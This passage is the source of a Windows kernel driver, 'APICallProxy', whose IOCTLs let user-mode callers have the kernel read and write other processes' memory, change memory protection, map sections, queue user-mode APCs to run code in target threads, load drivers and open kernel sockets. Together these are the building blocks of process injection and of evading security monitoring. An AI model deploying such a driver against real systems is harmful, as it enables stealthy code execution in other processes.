	IO_STATUS_BLOCK ioStatusBlock;

	__try {
		Status = ZwQueryInformationFile(*FileHandle, &ioStatusBlock, FileInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error While Geeting File size Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Getting File Size tatus Code 0x%x\n", Status);
#endif

	}
	return Status;
}

```

`APICallProxy/APICallProxy/General.h`:

```h
#pragma once


NTSTATUS APIProxyCloseHandle(HANDLE* Handle) {
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		Status = ObCloseHandle(*Handle, KernelMode);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error CloseHandle Status Code 0x%x\n", Status);
		}
#endif 
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while CloseHandle Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyAllocateVirtualMemory(AllocateVirtualMeomryInfo* AllocateMemoryInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	__try {
		Status = ZwAllocateVirtualMemory(AllocateMemoryInfo->ProcessHandle, &AllocateMemoryInfo->BaseAddress, 0, &AllocateMemoryInfo->RegionSize, AllocateMemoryInfo->AllocationType, AllocateMemoryInfo->Protect);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Allocation Memory inside process Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyFreeVirtualMemory(FreeVirtualMeomryInfo* FreeMemoryInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	SIZE_T RegionSize = NULL;

	__try {
		Status =  ZwFreeVirtualMemory(FreeMemoryInfo->ProcessHandle, &(FreeMemoryInfo->BaseAddress), &RegionSize, MEM_RELEASE);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Free Memory inside process Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyProtectVirtualMemory(VirtualProtectInfo* MemoryProtectionInfo) {
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		Status = ZwProtectVirtualMemory(MemoryProtectionInfo->ProcessHandle, &MemoryProtectionInfo->BaseAddress, &MemoryProtectionInfo->NumberOfBytesToProtect, MemoryProtectionInfo->NewAccessProtection, &MemoryProtectionInfo->OldAccessProtection);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Changing Memory Protection Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyReadVirtualMemory(ReadWriteVirtualMemoryInfo* ReadMemoryInfo) {
	NTSTATUS Status = STATUS_SUCCESS;

	PEPROCESS Process = NULL;

	Status = ObReferenceObjectByHandle(ReadMemoryInfo->ProcessHandle, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, (PVOID*)&Process, NULL);

	if (!NT_SUCCESS(Status)) {
		DbgPrint("APICallProxy: Error Refrence process using ObReferenceObjectByHandle Failed Status Code %x\n", Status);
		return Status;
	}

	__try {

		// TODO there is crash if the address in not valid
		SIZE_T Result;
		Status = MmCopyVirtualMemory(Process, ReadMemoryInfo->BaseAddress, PsGetCurrentProcess(), ReadMemoryInfo->Data, ReadMemoryInfo->DataLen, KernelMode, &Result);
#if DEBUG
		if (!NT_SUCCESS(Status))
			DbgPrint("APICallProxy: Error Reading Virtual Address Space using MmCopyVirtualMemory  Failed Status Code %x  %x\n", Status, Result);
#endif

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Allocation Memory inside process Status Code 0x%x\n", Status);
#endif

	}

	ObDereferenceObject(Process); // Dereference the target process

	return Status;
}

NTSTATUS APIProxyWriteVirtualMemory(_In_ ReadWriteVirtualMemoryInfo* WriteMemoryInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	PEPROCESS Process = NULL;

	Status = ObReferenceObjectByHandle(WriteMemoryInfo->ProcessHandle, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, (PVOID*)&Process, NULL);

	if (!NT_SUCCESS(Status)) {
		return Status;
	}

	__try {

		SIZE_T Result;
		Status = MmCopyVirtualMemory(PsGetCurrentProcess(), WriteMemoryInfo->Data, Process, WriteMemoryInfo->BaseAddress, WriteMemoryInfo->DataLen, KernelMode, &Result);

#if DEBUG
		if (!NT_SUCCESS(Status))
			DbgPrint("APICallProxy: Error Writting Virtual Address Space using MmCopyVirtualMemory  Failed Status Code %x\n", Status);
#endif

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Allocation Memory inside process Status Code 0x%x\n", Status);
#endif

	}

	ObDereferenceObject(Process); // Dereference the target process

	return Status;
}

NTSTATUS APIProxyQuerySystemInformation(ULONG InformationClass, PVOID InformationData, ULONG* DataSize) {

	ULONG bufferSize = 0;
	NTSTATUS Status = STATUS_SUCCESS;
	__try {

		Status = ZwQuerySystemInformation(InformationClass, InformationData, *DataSize, &bufferSize);
		if (Status == STATUS_INFO_LENGTH_MISMATCH) {
#if DEBUG
			DbgPrint("APICallProxy: Error Get System information Status Code 0x%x\n", Status);
#endif 
			Status = STATUS_BUFFER_TOO_SMALL;
			*DataSize = bufferSize;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Query System information Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyCreateSection(CreateSectionInfo* SectionInfo, HANDLE* SectionHandle) {
	NTSTATUS Status = STATUS_SUCCESS;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	UNICODE_STRING uniName;
	__try {
		RtlInitUnicodeString(&uniName, SectionInfo->SectionName);

		InitializeObjectAttributes(&objAttr, &uniName,
			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
			NULL, NULL);

		Status = ZwCreateSection(SectionHandle, SectionInfo->DesiredAccess, &objAttr, &SectionInfo->SectionMaxSize, SectionInfo->SectionPageProtection, SectionInfo->AllocationAttribute, SectionInfo->FileHandle);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Create Section Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyOpenSection(OpenSectionInfo* SectionInfo, HANDLE* SectionHandle) {
	NTSTATUS Status = STATUS_SUCCESS;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	UNICODE_STRING uniName;

	__try {

		RtlInitUnicodeString(&uniName, SectionInfo->SectionName);

		InitializeObjectAttributes(&objAttr, &uniName,
			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
			NULL, NULL);

		Status = ZwOpenSection(SectionHandle, SectionInfo->DesiredAccess, &objAttr);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Open Section Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}

NTSTATUS APIProxyMapViewOfSection(MapViewOfSectionInfo* MapInfo) {
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		Status = ZwMapViewOfSection(MapInfo->SectionHandle, MapInfo->ProcessHandle, &MapInfo->BaseAddress, 0, MapInfo->CommetSize, 0, &MapInfo->SizeOfView, ViewUnmap, 0, MapInfo->Win32Protect);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Map View Of Section Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}

NTSTATUS APIProxyUnMapViewOfSection(UNMapViewOfSectionInfo* UnMapInfo) {
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		Status = ZwUnmapViewOfSection(UnMapInfo->ProcessHandle, UnMapInfo->BaseAddress);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while UnMap View Of Section Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}

NTSTATUS APIProxyQueueUserAPC(QueueUSerApcInfo* APCInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	PRKAPC UserAPC, AlertAPC;

	__try {

		UserAPC = (PRKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
		if (!UserAPC) {
			Status = STATUS_INSUFFICIENT_RESOURCES;
			return Status;
		}

		AlertAPC = (PRKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
		if (!AlertAPC) {
			ExFreePool(UserAPC);
			Status = STATUS_INSUFFICIENT_RESOURCES;
			return Status;
		}

		PETHREAD PeThread;
		Status = ObReferenceObjectByHandle(APCInfo->ThreadHandle, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, (PVOID*)&PeThread, NULL);
		if (!NT_SUCCESS(Status)) {
			ExFreePool(UserAPC);
			ExFreePool(AlertAPC);
			return Status;
		}

		//used to execute code in user-mode
		KeInitializeApc(UserAPC, (PKTHREAD)PeThread, OriginalApcEnvironment, APIProxyApcKernelRoutine,
			NULL, (PKNORMAL_ROUTINE)APCInfo->ProcAddres, UserMode, APCInfo->ArgumentData);

		//used to make the thread in alertable state
		KeInitializeApc(AlertAPC, (PKTHREAD)PeThread, OriginalApcEnvironment, APIProxyApcAlertThread,
			NULL, NULL, KernelMode, NULL);

		if (KeInsertQueueApc(UserAPC, NULL, NULL, 0)) {
			if (KeInsertQueueApc(AlertAPC, NULL, NULL, 0)) {
				Status = PsIsThreadTerminating(PeThread) ? STATUS_THREAD_IS_TERMINATING : STATUS_SUCCESS;
			}
			else {
				Status = STATUS_UNSUCCESSFUL;
				ExFreePool(AlertAPC);
			}
		}
		else {
			Status = STATUS_UNSUCCESSFUL;
			ExFreePool(UserAPC);
			ExFreePool(AlertAPC);
		}


		ObDereferenceObject(PeThread);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Queuing APC Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}


NTSTATUS APIProxyLoadDriver(PUNICODE_STRING DriverRegistryPath) {
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		Status = ZwLoadDriver(DriverRegistryPath);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Loading Driver Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyUnLoadDriver(PUNICODE_STRING DriverRegistryPath) {
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		Status = ZwUnloadDriver(DriverRegistryPath);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Loading Driver Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}


```

`APICallProxy/APICallProxy/IOCTLCodes.h`:

```h
#pragma once

#pragma warning(disable : 4996)

#define DATA_TRANSFIRE_MODE METHOD_NEITHER	// METHOD_BUFFERED, METHOD_OUT_DIRECT, METHOD_IN_DIRECT 


#define API_PROXY_CREATEFILE 0x8000
#define IOCTL_API_PROXY_CREATEFILE CTL_CODE(API_PROXY_CREATEFILE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_OPENFILE 0x8001
#define IOCTL_API_PROXY_OPENFILE CTL_CODE(API_PROXY_OPENFILE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_DELETEFILE 0x8002
#define IOCTL_API_PROXY_DELETEFILE CTL_CODE(API_PROXY_DELETEFILE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_WRITEFILE 0x8003
#define IOCTL_API_PROXY_WRITEFILE CTL_CODE(API_PROXY_WRITEFILE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_READFILE 0x8004
#define IOCTL_API_PROXY_READFILE CTL_CODE(API_PROXY_READFILE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_TERMINATE_PROCESS 0x8005
#define IOCTL_API_PROXY_TERMINATE_PROCESS CTL_CODE(API_PROXY_TERMINATE_PROCESS, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_CLOSE_HANDLE 0x8006
#define IOCTL_API_PROXY_CLOSE_HANDLE CTL_CODE(API_PROXY_CLOSE_HANDLE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_GET_PID_FROM_PROCESSNAME 0x8007
#define IOCTL_API_PROXY_GET_PID_FROM_PROCESSNAME CTL_CODE(API_PROXY_GET_PID_FROM_PROCESSNAME, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_GET_FILE_SIZE_FROM_HANDLE 0x8008
#define IOCTL_API_PROXY_GET_FILE_SIZE_FROM_HANDLE CTL_CODE(API_PROXY_GET_FILE_SIZE_FROM_HANDLE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_OPEN_PROCESS 0x8013
#define IOCTL_API_PROXY_OPEN_PROCESS CTL_CODE(API_PROXY_OPEN_PROCESS, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_OPEN_THREAD 0x8019
#define IOCTL_API_PROXY_OPEN_THREAD CTL_CODE(API_PROXY_OPEN_THREAD, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_QUERY_SYSTEM_INFORMATION 0x8020
#define IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION CTL_CODE(API_PROXY_QUERY_SYSTEM_INFORMATION, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE 0x8014
#define IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE CTL_CODE(API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_WRITE_PROCESS_MEMORY 0x8017
#define IOCTL_API_PROXY_WRITE_PROCESS_MEMORY CTL_CODE(API_PROXY_WRITE_PROCESS_MEMORY, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_READ_PROCESS_MEMORY 0x8018
#define IOCTL_API_PROXY_READ_PROCESS_MEMORY CTL_CODE(API_PROXY_READ_PROCESS_MEMORY, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_SUSPEND_PROCESS 0x8021
#define IOCTL_API_PROXY_SUSPEND_PROCESS CTL_CODE(API_PROXY_SUSPEND_PROCESS, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_RESUME_PROCESS 0x8022
#define IOCTL_API_PROXY_RESUME_PROCESS CTL_CODE(API_PROXY_RESUME_PROCESS, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_CREATE_SECTION 0x8025
#define IOCTL_API_PROXY_CREATE_SECTION CTL_CODE(API_PROXY_CREATE_SECTION, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_MAP_VIEW_OF_SECTION 0x8026
#define IOCTL_API_PROXY_MAP_VIEW_OF_SECTION CTL_CODE(API_PROXY_MAP_VIEW_OF_SECTION, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_UNMAP_VIEW_OF_SECTION 0x8027
#define IOCTL_API_PROXY_UNMAP_VIEW_OF_SECTION CTL_CODE(API_PROXY_UNMAP_VIEW_OF_SECTION, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_OPEN_SECTION 0x8028
#define IOCTL_API_PROXY_OPEN_SECTION CTL_CODE(API_PROXY_OPEN_SECTION, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_SET_THREAD_CONTEXT 0x8029
#define IOCTL_API_PROXY_SET_THREAD_CONTEXT CTL_CODE(API_PROXY_SET_THREAD_CONTEXT, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_GET_THREAD_CONTEXT 0x8030
#define IOCTL_API_PROXY_GET_THREAD_CONTEXT CTL_CODE(API_PROXY_GET_THREAD_CONTEXT, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_VIRTUAL_PROTECT 0x8031
#define IOCTL_API_PROXY_VIRTUAL_PROTECT CTL_CODE(API_PROXY_VIRTUAL_PROTECT, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_QUEUE_APC 0x8015
#define IOCTL_API_PROXY_QUEUE_APC CTL_CODE(API_PROXY_QUEUE_APC, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)


#define API_PROXY_LOAD_DRIVER 0x8032
#define IOCTL_API_PROXY_LOAD_DRIVER CTL_CODE(API_PROXY_LOAD_DRIVER, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_UNLOAD_DRIVER 0x8033
#define IOCTL_API_PROXY_UNLOAD_DRIVER CTL_CODE(API_PROXY_UNLOAD_DRIVER, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_FREE_MEMORY_IN_PROCESS_USING_HANDLE 0x8034
#define IOCTL_API_PROXY_FREE_MEMORY_IN_PROCESS_USING_HANDLE CTL_CODE(API_PROXY_FREE_MEMORY_IN_PROCESS_USING_HANDLE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_CREATE_REGISTRY_KEY 0x8009
#define IOCTL_API_PROXY_CREATE_REGISTRY_KEY CTL_CODE(API_PROXY_CREATE_REGISTRY_KEY, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_OPEN_REGISTRY_KEY 0x8035
#define IOCTL_API_PROXY_OPEN_REGISTRY_KEY CTL_CODE(API_PROXY_OPEN_REGISTRY_KEY, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_REGISTRY_SET_KEY 0x8011
#define IOCTL_API_PROXY_REGISTRY_SET_KEY CTL_CODE(API_PROXY_REGISTRY_SET_KEY, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_DELETE_REGISTRY_KEY 0x8010
#define IOCTL_API_PROXY_DELETE_REGISTRY_KEY CTL_CODE(API_PROXY_DELETE_REGISTRY_KEY, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_REGISTRY_QUERY_KEY_VALUE 0x8012
#define IOCTL_API_PROXY_REGISTRY_QUERY_KEY_VALUE CTL_CODE(API_PROXY_REGISTRY_QUERY_KEY_VALUE, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)


#define API_PROXY_WSAStartup 0x8036
#define IOCTL_API_PROXY_WSAStartup CTL_CODE(API_PROXY_WSAStartup, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_WSACleanup 0x8037
#define IOCTL_API_PROXY_WSACleanup CTL_CODE(API_PROXY_WSACleanup, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_GetAddrInfo 0x8038
#define IOCTL_API_PROXY_GetAddrInfo CTL_CODE(API_PROXY_GetAddrInfo, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_Socket 0x8039
#define IOCTL_API_PROXY_Socket CTL_CODE(API_PROXY_Socket, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_Connect 0x8040
#define IOCTL_API_PROXY_Connect CTL_CODE(API_PROXY_Connect, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_Send 0x8041
#define IOCTL_API_PROXY_Send CTL_CODE(API_PROXY_Send, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_Recv 0x8042
#define IOCTL_API_PROXY_Recv CTL_CODE(API_PROXY_Recv, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_CloseSocket 0x8043
#define IOCTL_API_PROXY_CloseSocket CTL_CODE(API_PROXY_CloseSocket, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_listen 0x8044
#define IOCTL_API_PROXY_listen CTL_CODE(API_PROXY_listen, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_Bind 0x8045
#define IOCTL_API_PROXY_Bind CTL_CODE(API_PROXY_Bind, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_Accept 0x8046
#define IOCTL_API_PROXY_Accept CTL_CODE(API_PROXY_Accept, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_FreeAddrInfo 0x8047
#define IOCTL_API_PROXY_FreeAddrInfo CTL_CODE(API_PROXY_FreeAddrInfo, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

//TODO
//add netwoek API

#define API_PROXY_SendTo 0x8048
#define IOCTL_API_PROXY_SendTo CTL_CODE(API_PROXY_SendTo, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_RecvFrom 0x8049
#define IOCTL_API_PROXY_RecvFrom CTL_CODE(API_PROXY_RecvFrom, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

//
#define API_PROXY_CREATE_REMOTE_THREAD 0x8016
#define IOCTL_API_PROXY_CREATE_REMOTE_THREAD CTL_CODE(API_PROXY_CREATE_REMOTE_THREAD, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_CREATE_THREAD 0x8050
#define IOCTL_API_PROXY_CREATE_THREAD CTL_CODE(API_PROXY_CREATE_THREAD, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_SUSPEND_THREAD 0x8023
#define IOCTL_API_PROXY_SUSPEND_THREAD CTL_CODE(API_PROXY_SUSPEND_THREAD, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)

#define API_PROXY_RESUME_THREAD 0x8024
#define IOCTL_API_PROXY_RESUME_THREAD CTL_CODE(API_PROXY_RESUME_THREAD, 0x800, DATA_TRANSFIRE_MODE, FILE_ANY_ACCESS)










```

`APICallProxy/APICallProxy/Network.h`:

```h
#pragma once


NTSTATUS  APIProxyWSAStartup(OUT WSAStartCleanUp* WSASInfo) {
    UNREFERENCED_PARAMETER(WSASInfo);
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    WSK_CLIENT_NPI WskClient;



    PWSK_REGISTRATION WskRegistration = (PWSK_REGISTRATION)ExAllocatePoolWithTag(PagedPool, sizeof(WSK_REGISTRATION), MEMORY_TAG);
    PWSK_PROVIDER_NPI WskProvider = (PWSK_PROVIDER_NPI)ExAllocatePoolWithTag(PagedPool, sizeof(WSK_PROVIDER_NPI), MEMORY_TAG);
    PWSK_CLIENT_DISPATCH WskDispatch = (PWSK_CLIENT_DISPATCH)ExAllocatePoolWithTag(PagedPool, sizeof(WSK_CLIENT_DISPATCH), MEMORY_TAG);
    if (!WskRegistration || !WskProvider || !WskDispatch) {
        return STATUS_NO_MEMORY;
    }

    WskDispatch->Version = MAKE_WSK_VERSION(1, 0);
    WskDispatch->Reserved = 0;
    WskDispatch->WskClientEvent = NULL;

    WSASInfo->WskDispatchPtr = WskDispatch;
    WSASInfo->WskProviderPtr = WskProvider;
    WSASInfo->WskRegistrationPtr = WskRegistration;

    WskClient.ClientContext = NULL;
    WskClient.Dispatch = WskDispatch;

    Status = WskRegister(&WskClient, WskRegistration);

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    Status = WskCaptureProviderNPI(WskRegistration, WSK_INFINITE_WAIT, WskProvider);

    return Status;
}

NTSTATUS APIProxyWSACleanup(_In_ WSAStartCleanUp* WSASInfo) {

    WskReleaseProviderNPI((PWSK_REGISTRATION)WSASInfo->WskRegistrationPtr);
    WskDeregister((PWSK_REGISTRATION)WSASInfo->WskRegistrationPtr);

    return STATUS_SUCCESS;
}

NTSTATUS APIProxtGetAddrInfo(GetAddrInfoStruct* AddrInfo) {
    NTSTATUS Status;

    // Convert node name to the UNICODE_STRING (if present).
    ANSI_STRING NodeNameAnsi;
    UNICODE_STRING NodeNameUnicode;
    PUNICODE_STRING NodeName = NULL;

    if (AddrInfo->Node) {
        RtlInitAnsiString(&NodeNameAnsi, AddrInfo->Node);
        Status = RtlAnsiStringToUnicodeString(&NodeNameUnicode, &NodeNameAnsi, TRUE);

        if (!NT_SUCCESS(Status)) {
            goto Error1;
        }

        NodeName = &NodeNameUnicode;
    }


    // Convert service name to the UNICODE_STRING (if present).
    ANSI_STRING ServiceNameAnsi;
    UNICODE_STRING ServiceNameUnicode;
    PUNICODE_STRING ServiceName = NULL;

    if (AddrInfo->Service) {
        RtlInitAnsiString(&ServiceNameAnsi, AddrInfo->Service);
        Status = RtlAnsiStringToUnicodeString(&ServiceNameUnicode, &ServiceNameAnsi, TRUE);

        if (!NT_SUCCESS(Status)) {
            goto Error2;
        }

        ServiceName = &ServiceNameUnicode;
    }

    // Convert "struct addrinfo" to the "ADDRINFOEXW".
    PADDRINFOEXW Hints;
    Status = APIProxyAddrInfoToAddrInfoEx(AddrInfo->Hints, &Hints);

    if (!NT_SUCCESS(Status)) {
        goto Error3;
    }

    // All data is prepared, call the underlying API.
    PADDRINFOEXW Result;
    Status = KsGetAddrInfo(&AddrInfo->SocketInfo, NodeName, ServiceName, Hints, &Result);

    // Free the memory of the converted "Hints".
    APIProxyFreeAddrInfoEx(Hints);

    if (!NT_SUCCESS(Status)) {
        goto Error3;
    }

    // Convert the result "ADDRINFOEXW" to the "struct addrinfo".
    Status = APIProxyAddrInfoExToAddrInfo(Result, AddrInfo->Result);

    // Free the original result.
    KsFreeAddrInfo(&AddrInfo->SocketInfo, Result);

    if (!NT_SUCCESS(Status)) {
        goto Error3;
    }

    return STATUS_SUCCESS;

Error3:
    if (ServiceName) {
        RtlFreeUnicodeString(&ServiceNameUnicode);
    }

Error2:
    if (NodeName) {
        RtlFreeUnicodeString(&NodeNameUnicode);
    }

Error1:
    return Status;
}

NTSTATUS APIProxyFreeAddrInfo(struct addrinfo* AddrInfo) {

    APIProxyFreeAddrInfoUtility(AddrInfo);

    return STATUS_SUCCESS;
}

NTSTATUS APIProxySocket(WSAStartCleanUp* WSAInfo, PKSOCKET* Socket, int Domain, int Type, int Protocol, _In_ ULONG Flags) {
    NTSTATUS Status;

    Status = KsCreateSocket(WSAInfo, Socket, (ADDRESS_FAMILY)Domain, (USHORT)Type, (ULONG)Protocol, Flags);

    return Status;
}

NTSTATUS APIProxyCloseSocket(PKSOCKET Socket) {
    NTSTATUS Status;

    Status = KsCloseSocket(Socket);

    return Status;
}

NTSTATUS APIProxyConnect(ConnectStruct* ConnectInfo)
{
    NTSTATUS Status;


    Status = KsConnect((PKSOCKET)ConnectInfo->Socket, (PSOCKADDR)ConnectInfo->AddrInfo->ai_addr);

    return Status;

}

NTSTATUS APIProxyListen() {
    return STATUS_SUCCESS;
}

NTSTATUS APIProxyBind(BindStruct* BindInfo) {

    NTSTATUS Status;

    Status = KsBind((PKSOCKET)BindInfo->Socket, (PSOCKADDR)BindInfo->Address);

    return Status;
}

NTSTATUS APIProxyAccept(AcceptStruct* AcceptInfo) {
    
    NTSTATUS Status;

    PKSOCKET NewSocket;

    struct sockaddr_in addr;
    addr.sin_family = AcceptInfo->Address->sin_family;
    addr.sin_addr.s_addr = AcceptInfo->Address->sin_addr.S_un.S_addr;
    addr.sin_port = AcceptInfo->Address->sin_port;


    Status = KsAccept((PKSOCKET)AcceptInfo->Socket, &NewSocket, NULL, (PSOCKADDR)&addr);

    AcceptInfo->NewSocket = (PVOID)NewSocket;
    *AcceptInfo->SocketLen = sizeof(SOCKADDR);

    return Status;
}

NTSTATUS APIProxySend(SendRecvStruct* SendInfo) {
    NTSTATUS Status;

    ULONG Length = (ULONG)SendInfo->BufferLen;
    Status = KsSend((PKSOCKET)SendInfo->Socket, SendInfo->Buffer, &Length, 0);

    return Status;

}

